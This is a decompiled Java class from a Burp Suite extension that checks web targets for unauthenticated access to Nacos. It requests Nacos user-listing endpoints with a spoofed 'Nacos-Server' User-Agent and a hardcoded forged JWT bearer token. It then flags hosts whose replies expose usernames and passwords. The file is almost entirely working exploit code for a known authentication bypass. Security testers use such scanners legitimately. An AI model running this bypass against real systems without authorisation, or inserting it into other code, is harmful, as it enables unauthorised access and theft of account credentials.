/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package burp.ScanFun;

import burp.BurpExtender;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.utils.Common;
import burp.utils.Config;
import java.net.URL;
import java.util.List;

public class NacosScan {
    private static final String[] poc_unauth_nacos = new String[]{"nacos/v1/auth/users?search=accurate&pageNo=1&pageSize=10", "v1/auth/users?search=accurate&pageNo=1&pageSize=10", "nacos/"};

    public static IHttpRequestResponse NacosUnauthScan(IHttpRequestResponse reqres, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, String custompath) {
        List<String> headers = helpers.analyzeRequest(reqres.getRequest()).getHeaders();
        URL url = helpers.analyzeRequest(reqres).getUrl();
        for (int i = 0; i < poc_unauth_nacos.length; ++i) {
            headers.set(0, "GET " + custompath + "/" + poc_unauth_nacos[i] + " HTTP/1.1");
            int remove_header_id = -1;
            for (int j = 0; j < headers.size(); ++j) {
                String header_i = headers.get(j);
                if (!header_i.contains("User-Agent")) continue;
                remove_header_id = j;
                break;
            }
            if (remove_header_id != -1) {
                headers.remove(remove_header_id);
            }
            headers.add("User-Agent: Nacos-Server");
            headers.add("Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MjIxNTM1MzYxMX0.OByCJOavjOqGQsw-DrmAORXgsUgdV6FsVJ0yguXbs-8");
            byte[] body = helpers.buildHttpMessage(headers, null);
            IHttpRequestResponse nacosreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
            try {
                Thread.currentThread();
                Thread.sleep(Integer.parseInt(Config.get("enabled_sleep_value", "500")));
            } catch (InterruptedException e) {
                BurpExtender.stdout.println(e.getMessage());
            }
            if (nacosreqres == null || nacosreqres.getResponse() == null) continue;
            String res = Common.getResbody(nacosreqres.getResponse(), helpers);
            if (res.contains("<title>Nacos</title>")) {
                BurpExtender.scannedDomainURL_nacos.add(url.getHost() + ":" + url.getPort());
                return nacosreqres;
            }
            if (!res.contains("totalCount") || !res.contains("username") || !res.contains("password")) continue;
            BurpExtender.scannedDomainURL_nacos.add(url.getHost() + ":" + url.getPort());
            return nacosreqres;
        }
        BurpExtender.scannedDomainURL_nacos.add(url.getHost() + ":" + url.getPort());
        return null;
    }
}

